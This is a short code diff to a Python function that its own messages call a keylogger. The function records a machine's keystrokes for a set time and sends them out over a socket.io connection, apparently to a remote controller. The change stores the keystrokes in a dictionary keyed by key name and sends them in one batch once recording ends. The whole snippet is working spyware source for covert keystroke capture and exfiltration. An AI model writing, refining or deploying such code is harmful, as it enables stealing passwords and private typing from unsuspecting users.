@@ -71,13 +71,18 @@ def record_and_send_keyboard_log(duration=10, sio=None):
     try:
         print("Enregistrement du keylogger en cours...")
         start_time = time.time()
-        keyboard_log = []
+        keyboard_log = {}
 
         while time.time() - start_time < duration:
             event = keyboard.read_event()
-            keyboard_log.append((event.name, event.time))
+            keyboard_log[event.name] = time.time()  # Enregistrer chaque événement avec son horodatage dans un dictionnaire
 
-            sio.emit('keyboard_response', {'keyboard_log': keyboard_log})
+        # Convertir le dictionnaire en une liste de tuples (nom de l'événement, horodatage)
+        keyboard_log_list = [(key, value) for key, value in keyboard_log.items()]
+
+        # Émettre l'événement seulement si le journal n'est pas vide
+        if keyboard_log_list and sio:
+            sio.emit('keyboard_response', {'keyboard_log': keyboard_log_list})
 
         print("Enregistrement du keylogger terminé")
     except Exception as e:
